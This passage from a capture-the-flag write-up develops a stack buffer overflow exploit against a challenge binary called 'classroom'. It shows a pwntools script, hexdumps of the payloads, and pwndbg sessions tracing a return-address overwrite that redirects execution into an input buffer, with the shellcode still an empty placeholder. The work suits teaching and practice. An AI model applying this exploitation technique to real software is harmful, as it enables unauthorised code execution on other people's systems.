00000090  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
*
00000190
```

For payload1 we can use something similar to the below:

```python
shellcode = '' # shellcode placeholder

payload1 = fit({
    0: shellcode
    }, filler=cyclic(92), length=92)
```

And in `ipython` we can verify:

```python
In [22]: shellcode = '' # shellcode placeholder

In [23]: payload1 = fit({
    ...: 0: shellcode
    ...: }, filler=cyclic(92), length=92)
<ipython-input-23-ea8b22b47255>:1: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  payload1 = fit({

In [24]: print(hexdump(payload1))
00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
00000050  75 61 61 61  76 61 61 61  77 61 61 61               │uaaa│vaaa│waaa│
0000005c

```

Finally, for handling input and output we can add before `io.interactive()` something like the below to handle interaction with the binary:

```python
io.recvuntil(b'> ')    # receive everything and wait for prompt
io.sendline(payload1)  # send payload1 at the `Is everything clear?                             (y/n)` question
io.recvuntil(b'> ')    # continue receiving and sending data until                              the 5th question 
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')    # `Well, maybe a last one and then we finish!`                           prompt
io.send(payload2)      # send payload2

# flag = io.recvall()
# log.success(flag)
io.interactive()
```

Our updated `sploit.py` with the addition of some `print` statements for debugging is as follows: 

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 192.168.13.37 --port 8000 ./classroom
from pwn import *

context.log_level = 'debug'

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './classroom')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '192.168.13.37'
port = int(args.PORT or 8000)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

shellcode = '' # shellcode placeholder

payload1 = fit({
    0: shellcode
    }, filler=cyclic(92), length=92)
print(hexdump(payload1))

payload2 = fit({
    136: p64(0x40090c)
    }, filler=asm(shellcraft.nop()), length=400)
print(hexdump(payload2))

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

pause()

io.recvuntil(b'> ')    # receive everything and wait for prompt
io.sendline(payload1)  # send payload1 at the `Is everything clear? (y/n)` question
io.recvuntil(b'> ')    # continue receiving and sending data until the 5th question 
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')    # `Well, maybe a last one and then we finish!` prompt
io.send(payload2)      # send payload2
flag = io.recvall()
log.success(flag)
#io.interactive()
```

We are setting a breakpoint right before the 5th question `read()` in the `kinder()` function

```python
~/D/W/b/pwn $ gdb ./classroom
pwndbg> disassemble kinder
Dump of assembler code for function kinder:
...[snip]...
   0x0000000000400a32 <+226>:   lea    rax,[rbp-0x80]
   0x0000000000400a36 <+230>:   mov    edx,0x14c
   0x0000000000400a3b <+235>:   mov    rsi,rax
   0x0000000000400a3e <+238>:   mov    edi,0x0
   0x0000000000400a43 <+243>:   call   0x400740 <read@plt>
...[snip]...
pwndbg> b *0x0000000000400a3e
```

In a seperate terminal run `sploit.py`

```shell
~/D/W/b/pwn $ python3 sploit.py LOCAL
[*] '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
/home/kidd/Desktop/WORK/bsides24/pwn/sploit.py:63: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  payload1 = fit({
00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
00000050  75 61 61 61  76 61 61 61  77 61 61 61               │uaaa│vaaa│waaa│
0000005c
[DEBUG] cpp -C -nostdinc -undef -P -I/home/kidd/.local/lib/python3.11/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        nop
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-aznj2u87/step2 /tmp/pwn-asm-aznj2u87/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-aznj2u87/step3 /tmp/pwn-asm-aznj2u87/step4
00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
*
00000080  90 90 90 90  90 90 90 90  0c 09 40 00  00 00 00 00  │····│····│··@·│····│
00000090  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
*
00000190
[+] Starting local process '/home/kidd/Desktop/WORK/bsides24/pwn/classroom': pid 33577
[*] Paused (press any to continue) ### attach the debugger at this point
```

In the `pwndbg` terminal

```
~/D/W/b/pwn $ gdb -q ./classroom
Poetry could not find a pyproject.toml file in /home/kidd/Desktop/WORK/bsides24/pwn or its parents
pwndbg: loaded 157 pwndbg commands and 48 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $ida GDB functions (can be used with print/break)
Reading symbols from ./classroom...
(No debugging symbols found in ./classroom)
------- tip of the day (disable with set show-tips off) -------
GDB's follow-fork-mode parameter can be used to set whether to trace parent or child after fork() calls
```

Attach to the process

```c
pwndbg> attach 33577
Attaching to program: /home/kidd/Desktop/WORK/bsides24/pwn/classroom, process 33577
Reading symbols from /lib/x86_64-linux-gnu/libseccomp.so.2...
(No debugging symbols found in /lib/x86_64-linux-gnu/libseccomp.so.2)
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...
Reading symbols from /usr/lib/debug/.build-id/2e/01923fea4ad9f7fa50fe24e0f3385a45a6cd1c.debug...
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/a9/700083811ae36d1017fe16ebe5657d59cdda0a.debug...
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
0x00007f4054f38a1d in __GI___libc_read (fd=0, buf=0x602040 <ans>, nbytes=96) at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────
RAX  0xfffffffffffffe00
 RBX  0x7ffe3275dbf8 —▸ 0x7ffe3275e4f5 ◂— '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
 RCX  0x7f4054f38a1d (read+13) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x60
 RDI  0
 RSI  0x602040 (ans) ◂— 0
 R8   0xc000
 R9   7
 R10  7
 R11  0x246
 R12  0
 R13  0x7ffe3275dc08 —▸ 0x7ffe3275e524 ◂— 'PWD=/home/kidd/Desktop/WORK/bsides24/pwn'
 R14  0x7f405508c000 (_rtld_global) —▸ 0x7f405508d2c0 ◂— 0
 R15  0
 RBP  0x7ffe3275dae0 ◂— 1
 RSP  0x7ffe3275dac8 —▸ 0x400ba0 (main+104) ◂— mov eax, 0
 RIP  0x7f4054f38a1d (read+13) ◂— cmp rax, -0x1000 /* 'H=' */
─────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────── 
 ► 0x7f4054f38a1d <read+13>     cmp    rax, -0x1000     0xfffffffffffffe00 - 0xfffffffffffff000     EFLAGS => 0x206 [ cf PF af zf sf IF df of ]   
   0x7f4054f38a23 <read+19>   ✔ ja     read+112                    <read+112>
    ↓
   0x7f4054f38a80 <read+112>    mov    rdx, qword ptr [rip + 0xd7379]     RDX, [_GLOBAL_OFFSET_TABLE_+624] => 0xffffffffffffff88
   0x7f4054f38a87 <read+119>    neg    eax
   0x7f4054f38a89 <read+121>    mov    dword ptr fs:[rdx], eax
   0x7f4054f38a8c <read+124>    mov    rax, 0xffffffffffffffff            RAX => 0xffffffffffffffff
   0x7f4054f38a93 <read+131>    ret    
 
   0x7f4054f38a94 <read+132>    nop    dword ptr [rax]
   0x7f4054f38a98 <read+136>    mov    rdx, qword ptr [rip + 0xd7361]     RDX, [_GLOBAL_OFFSET_TABLE_+624] => 0xffffffffffffff88
   0x7f4054f38a9f <read+143>    neg    eax
   0x7f4054f38aa1 <read+145>    mov    dword ptr fs:[rdx], eax
───────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffe3275dac8 —▸ 0x400ba0 (main+104) ◂— mov eax, 0
01:0008│-010 0x7ffe3275dad0 —▸ 0x400db0 ◂— imul rsp, qword ptr [r11 + r14*2 + 0x20], 0x7473756d
02:0010│-008 0x7ffe3275dad8 —▸ 0x400d96 ◂— 'Have a nice day!!\n'
03:0018│ rbp 0x7ffe3275dae0 ◂— 1
04:0020│+008 0x7ffe3275dae8 —▸ 0x7f4054e61c8a (__libc_start_call_main+122) ◂— mov edi, eax
05:0028│+010 0x7ffe3275daf0 —▸ 0x7ffe3275dbe0 —▸ 0x7ffe3275dbe8 ◂— 0x38 /* '8' */
06:0030│+018 0x7ffe3275daf8 —▸ 0x400b38 (main) ◂— push rbp
07:0038│+020 0x7ffe3275db00 ◂— 0x100400040 /* '@' */
─────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────
 ► 0   0x7f4054f38a1d read+13
   1         0x400ba0 main+104
   2   0x7f4054e61c8a __libc_start_call_main+122
   3   0x7f4054e61d45 __libc_start_main+133
   4         0x40078a _start+42
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Disassemble `kinder()` and add a breakpoint right after the 5th read(), at `0x0000000000400a48`

```c
pwndbg> disassemble kinder
Dump of assembler code for function kinder:
   0x0000000000400950 <+0>:     push   rbp
   0x0000000000400951 <+1>:     mov    rbp,rsp
   0x0000000000400954 <+4>:     add    rsp,0xffffffffffffff80
...[snip]...
   0x0000000000400a32 <+226>:   lea    rax,[rbp-0x80]
   0x0000000000400a36 <+230>:   mov    edx,0x14c
   0x0000000000400a3b <+235>:   mov    rsi,rax
   0x0000000000400a3e <+238>:   mov    edi,0x0
   0x0000000000400a43 <+243>:   call   0x400740 <read@plt>
   0x0000000000400a48 <+248>:   jmp    0x400ade <kinder+398>
...[snip]...
   0x0000000000400ae8 <+408>:   nop
   0x0000000000400ae9 <+409>:   leave
   0x0000000000400aea <+410>:   ret
End of assembler dump.
pwndbg> b *0x0000000000400a48
Breakpoint 1 at 0x400a48
```

Continue the execution of both `pwndbg` and `sploit.py`.

Below is the output of `sploit.py`

```
...[snip]...
[DEBUG] Received 0x7e bytes:
    00000000  4b 69 64 73  20 6d 75 73  74 20 66 6f  6c 6c 6f 77  │Kids│ mus│t fo│llow│
    00000010  20 74 68 65  20 72 75 6c  65 73 21 0a  31 2e 20 4e  │ the│ rul│es!·│1. N│
    00000020  6f 20 63 68  65 61 74 69  6e 67 21 20  20 20 e2 9d  │o ch│eati│ng! │  ··│
    00000030  8c 0a 32 2e  20 4e 6f 20  73 77 65 61  72 69 6e 67  │··2.│ No │swea│ring│
    00000040  21 20 20 20  e2 9d 8c 0a  33 2e 20 4e  6f 20 f0 9f  │!   │····│3. N│o ··│
    00000050  9a a9 20 73  68 61 72 69  6e 67 21 20  e2 9d 8c 0a  │·· s│hari│ng! │····│
    00000060  0a 49 73 20  65 76 65 72  79 74 68 69  6e 67 20 63  │·Is │ever│ythi│ng c│
    00000070  6c 65 61 72  3f 20 28 79  2f 6e 29 0a  3e 20        │lear│? (y│/n)·│> │
    0000007e
[DEBUG] Sent 0x5d bytes:
    b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaa\n'
...[snip]...
    b'Enough questions for today class...\n'
    b'Well, maybe a last one and then we finish!\n'
    b'> '
[DEBUG] Sent 0x190 bytes:
    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000080  90 90 90 90  90 90 90 90  0c 09 40 00  00 00 00 00  │····│····│··@·│····│
    00000090  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000190
[*] Switching to interactive mode
[DEBUG] Received 0x3a bytes:
    00000000  57 68 61 74  20 61 72 65  20 79 6f 75  20 64 6f 69  │What│ are│ you│ doi│
    00000010  6e 67 20 68  65 72 65 3f  21 20 4b 69  64 73 20 61  │ng h│ere?│! Ki│ds a│
    00000020  72 65 20 6e  6f 74 20 61  6c 6c 6f 77  65 64 20 68  │re n│ot a│llow│ed h│
    00000030  65 72 65 21  20 f0 9f 94  9e 0a                     │ere!│ ···│··│
    0000003a
What are you doing here?! Kids are not allowed here! 🔞
[*] Got EOF while reading in interactive
$ 
[DEBUG] Sent 0x1 bytes:
    b'\n'
[*] Process '/home/kidd/Desktop/WORK/bsides24/pwn/classroom' stopped with exit code -9 (SIGKILL) (pid 33577)
[*] Got EOF while sending in interactive
```

In pwndbg the program will first break after `read()`, where `$rsp` (=`$rsi`) and `$rbp` point to our buffer.

```python
pwndbg> c
Continuing.

Breakpoint 1, 0x0000000000400a48 in kinder ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off─────────────────────────────────────────────
*RAX  0x14c
 RBX  0x7ffe3275dbf8 —▸ 0x7ffe3275e4f5 ◂— '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
 RCX  0x7f4054f38a1d (read+13) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x14c
 RDI  0
*RSI  0x7ffe3275da40 ◂— 0x9090909090909090
*R8   0xff00
 R9   7
 R10  7
 R11  0x246
 R12  0
 R13  0x7ffe3275dc08 —▸ 0x7ffe3275e524 ◂— 'PWD=/home/kidd/Desktop/WORK/bsides24/pwn'
 R14  0x7f405508c000 (_rtld_global) —▸ 0x7f405508d2c0 ◂— 0
 R15  0
*RBP  0x7ffe3275dac0 ◂— 0x9090909090909090
*RSP  0x7ffe3275da40 ◂— 0x9090909090909090
*RIP  0x400a48 (kinder+248) ◂— jmp 0x400ade
───────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────
 ► 0x400a48 <kinder+248>                      jmp    kinder+398                  <kinder+398>
    ↓
   0x400ade <kinder+398>                      cmp    dword ptr [rbp - 4], 0     0x90909090 - 0x0     EFLAGS => 0x286 [ cf PF af zf SF IF df of ]
   0x400ae2 <kinder+402>                      je     kinder+107                  <kinder+107>
 
   0x400ae8 <kinder+408>                      nop    
   0x400ae9 <kinder+409>                      leave  
   0x400aea <kinder+410>                      ret                                <kids_are_not_allowed_here>
    ↓
   0x40090c <kids_are_not_allowed_here>       push   rbp
   0x40090d <kids_are_not_allowed_here+1>     mov    rbp, rsp                     RBP => 0x7ffe3275dac8 ◂— 0x9090909090909090
   0x400910 <kids_are_not_allowed_here+4>     sub    rsp, 0x10                    RSP => 0x7ffe3275dab8 (0x7ffe3275dac8 - 0x10)
   0x400914 <kids_are_not_allowed_here+8>     lea    rax, [rip + 0x34d]           RAX => 0x400c68 ◂— push rdi
   0x40091b <kids_are_not_allowed_here+15>    mov    qword ptr [rbp - 8], rax     [0x7ffe3275dac0] => 0x400c68 ◂— push rdi
─────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────
00:0000│ rsi rsp 0x7ffe3275da40 ◂— 0x9090909090909090
... ↓            7 skipped
───────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────
 ► 0         0x400a48 kinder+248
   1         0x40090c kids_are_not_allowed_here
   2 0x9090909090909090
   3 0x9090909090909090
   4 0x9090909090909090
   5 0x9090909090909090
   6 0x9090909090909090
   7 0x9090909090909090
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

If we continue execution until the function epilogue, `$rsp` now points to `0x40090c` or the `kids_are_not_allowed_here` function.

```c
pwndbg> stepret 

Temporary breakpoint -11, 0x0000000000400ae2 in kinder ()

Temporary breakpoint -12, 0x0000000000400aea in kinder ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────
 RAX  0x14c
 RBX  0x7ffe3275dbf8 —▸ 0x7ffe3275e4f5 ◂— '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
 RCX  0x7f4054f38a1d (read+13) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x14c
 RDI  0
 RSI  0x7ffe3275da40 ◂— 0x9090909090909090
 R8   0xff00
 R9   7
 R10  7
 R11  0x246
 R12  0
 R13  0x7ffe3275dc08 —▸ 0x7ffe3275e524 ◂— 'PWD=/home/kidd/Desktop/WORK/bsides24/pwn'
 R14  0x7f405508c000 (_rtld_global) —▸ 0x7f405508d2c0 ◂— 0
 R15  0
*RBP  0x9090909090909090
*RSP  0x7ffe3275dac8 —▸ 0x40090c (kids_are_not_allowed_here) ◂— push rbp
*RIP  0x400aea (kinder+410) ◂— ret 
─────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────
   0x400a48 <kinder+248>                      jmp    kinder+398                  <kinder+398>
    ↓
   0x400ade <kinder+398>                      cmp    dword ptr [rbp - 4], 0     0x90909090 - 0x0     EFLAGS => 0x286 [ cf PF af zf SF IF df of ]
   0x400ae2 <kinder+402>                      je     kinder+107                  <kinder+107>
 
   0x400ae8 <kinder+408>                      nop    
   0x400ae9 <kinder+409>                      leave  
 ► 0x400aea <kinder+410>                      ret                                <kids_are_not_allowed_here>
    ↓
   0x40090c <kids_are_not_allowed_here>       push   rbp
   0x40090d <kids_are_not_allowed_here+1>     mov    rbp, rsp                     RBP => 0x7ffe3275dac8 ◂— 0x9090909090909090
   0x400910 <kids_are_not_allowed_here+4>     sub    rsp, 0x10                    RSP => 0x7ffe3275dab8 (0x7ffe3275dac8 - 0x10)
   0x400914 <kids_are_not_allowed_here+8>     lea    rax, [rip + 0x34d]           RAX => 0x400c68 ◂— push rdi
   0x40091b <kids_are_not_allowed_here+15>    mov    qword ptr [rbp - 8], rax     [0x7ffe3275dac0] => 0x400c68 ◂— push rdi
───────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffe3275dac8 —▸ 0x40090c (kids_are_not_allowed_here) ◂— push rbp
01:0008│     0x7ffe3275dad0 ◂— 0x9090909090909090
... ↓        6 skipped
─────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────
 ► 0         0x400aea kinder+410
   1         0x40090c kids_are_not_allowed_here
   2 0x9090909090909090
   3 0x9090909090909090
   4 0x9090909090909090
   5 0x9090909090909090
   6 0x9090909090909090
   7 0x9090909090909090
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

We continue execution into the `kids_are_not_allowed_here()` function

```c
pwndbg> s
0x000000000040090c in kids_are_not_allowed_here ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────
 RAX  0x14c
 RBX  0x7ffe3275dbf8 —▸ 0x7ffe3275e4f5 ◂— '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
 RCX  0x7f4054f38a1d (read+13) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x14c
 RDI  0
 RSI  0x7ffe3275da40 ◂— 0x9090909090909090
 R8   0xff00
 R9   7
 R10  7
 R11  0x246
 R12  0
 R13  0x7ffe3275dc08 —▸ 0x7ffe3275e524 ◂— 'PWD=/home/kidd/Desktop/WORK/bsides24/pwn'
 R14  0x7f405508c000 (_rtld_global) —▸ 0x7f405508d2c0 ◂— 0
 R15  0
 RBP  0x9090909090909090
*RSP  0x7ffe3275dad0 ◂— 0x9090909090909090
*RIP  0x40090c (kids_are_not_allowed_here) ◂— push rbp
─────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────
   0x400ade <kinder+398>                      cmp    dword ptr [rbp - 4], 0     0x90909090 - 0x0     EFLAGS => 0x286 [ cf PF af zf SF IF df of ]
   0x400ae2 <kinder+402>                      je     kinder+107                  <kinder+107>
 
   0x400ae8 <kinder+408>                      nop    
   0x400ae9 <kinder+409>                      leave  
   0x400aea <kinder+410>                      ret                                <kids_are_not_allowed_here>
    ↓
 ► 0x40090c <kids_are_not_allowed_here>       push   rbp
   0x40090d <kids_are_not_allowed_here+1>     mov    rbp, rsp                     RBP => 0x7ffe3275dac8 ◂— 0x9090909090909090
   0x400910 <kids_are_not_allowed_here+4>     sub    rsp, 0x10                    RSP => 0x7ffe3275dab8 (0x7ffe3275dac8 - 0x10)
   0x400914 <kids_are_not_allowed_here+8>     lea    rax, [rip + 0x34d]           RAX => 0x400c68 ◂— push rdi
   0x40091b <kids_are_not_allowed_here+15>    mov    qword ptr [rbp - 8], rax     [0x7ffe3275dac0] => 0x400c68 ◂— push rdi
   0x40091f <kids_are_not_allowed_here+19>    mov    rax, qword ptr [rbp - 8]     RAX, [0x7ffe3275dac0] => 0x400c68 ◂— push rdi
───────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffe3275dad0 ◂— 0x9090909090909090
... ↓        7 skipped
─────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────
 ► 0         0x40090c kids_are_not_allowed_here
   1 0x9090909090909090
   2 0x9090909090909090
   3 0x9090909090909090
   4 0x9090909090909090
   5 0x9090909090909090
   6 0x9090909090909090
   7 0x9090909090909090
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Disassemble the `kids_are_not_allowed_here()` function

```c
pwndbg> disassemble kids_are_not_allowed_here 
Dump of assembler code for function kids_are_not_allowed_here:
=> 0x000000000040090c <+0>:     push   rbp
   0x000000000040090d <+1>:     mov    rbp,rsp
   0x0000000000400910 <+4>:     sub    rsp,0x10
   0x0000000000400914 <+8>:     lea    rax,[rip+0x34d]        # 0x400c68
   0x000000000040091b <+15>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040091f <+19>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400923 <+23>:    mov    rdi,rax
   0x0000000000400926 <+26>:    call   0x400720 <strlen@plt>
   0x000000000040092b <+31>:    mov    rdx,rax
   0x000000000040092e <+34>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400932 <+38>:    mov    rsi,rax
   0x0000000000400935 <+41>:    mov    edi,0x1
   0x000000000040093a <+46>:    call   0x400700 <write@plt>
   0x000000000040093f <+51>:    lea    rdx,[rip+0x2016fa]        # 0x602040 <ans>
   0x0000000000400946 <+58>:    mov    eax,0x0
   0x000000000040094b <+63>:    call   rdx
   0x000000000040094d <+65>:    nop
   0x000000000040094e <+66>:    leave
   0x000000000040094f <+67>:    ret
End of assembler dump.
```

 Set a breakpoint at the `call rdx` instruction at `0x000000000040094b` and continue execution within the `kids_are_not_allowed_here()` funtion. 
 Note our payload buffer intact in the address pointed to by RDX

```c
pwndbg> b * 0x000000000040094b
Breakpoint 2 at 0x40094b
pwndbg> c
Continuing.

Breakpoint 2, 0x000000000040094b in kids_are_not_allowed_here ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────
*RAX  0
 RBX  0x7ffe3275dbf8 —▸ 0x7ffe3275e4f5 ◂— '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
*RCX  0x7f4054f394e0 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x602040 (ans) ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaa\n'
*RDI  1
*RSI  0x400c68 ◂— push rdi
*R8   4
 R9   7
 R10  7
*R11  0x202
 R12  0
 R13  0x7ffe3275dc08 —▸ 0x7ffe3275e524 ◂— 'PWD=/home/kidd/Desktop/WORK/bsides24/pwn'
 R14  0x7f405508c000 (_rtld_global) —▸ 0x7f405508d2c0 ◂— 0
 R15  0
*RBP  0x7ffe3275dac8 ◂— 0x9090909090909090
*RSP  0x7ffe3275dab8 ◂— 0x9090909090909090
*RIP  0x40094b (kids_are_not_allowed_here+63) ◂— call rdx
─────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────
 ► 0x40094b <kids_are_not_allowed_here+63>    call   rdx                         <ans>
        rdi: 1
        rsi: 0x400c68 ◂— push rdi
        rdx: 0x602040 (ans) ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaa\n'
        rcx: 0x7f4054f394e0 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
 
   0x40094d <kids_are_not_allowed_here+65>    nop    
   0x40094e <kids_are_not_allowed_here+66>    leave  
   0x40094f <kids_are_not_allowed_here+67>    ret    
 
   0x400950 <kinder>                          push   rbp
   0x400951 <kinder+1>                        mov    rbp, rsp
   0x400954 <kinder+4>                        add    rsp, -0x80
   0x400958 <kinder+8>                        mov    dword ptr [rbp - 4], 0
   0x40095f <kinder+15>                       lea    rax, [rip + 0x33d]              RAX => 0x400ca3 ◂— 'Have a nice day!\n'
   0x400966 <kinder+22>                       mov    qword ptr [rbp - 0x10], rax
   0x40096a <kinder+26>                       lea    rax, [rip + 0x347]              RAX => 0x400cb8 ◂— push rsi /* 'Very interesting question! Let me think about it.....' */
───────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffe3275dab8 ◂— 0x9090909090909090
01:0008│-008 0x7ffe3275dac0 —▸ 0x400c68 ◂— push rdi
02:0010│ rbp 0x7ffe3275dac8 ◂— 0x9090909090909090
... ↓        5 skipped
─────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────
 ► 0         0x40094b kids_are_not_allowed_here+63
   1 0x9090909090909090
   2 0x9090909090909090
   3 0x9090909090909090
   4 0x9090909090909090
   5 0x9090909090909090
   6 0x9090909090909090
   7 0x9090909090909090
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

We resume execution at `call rdx` which holds the reference to an address that is storing our payload - which is not valid shellcode yet, just the output of the `cyclic` command - and as expected leads to a crash.

```c
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000602040 in ans ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
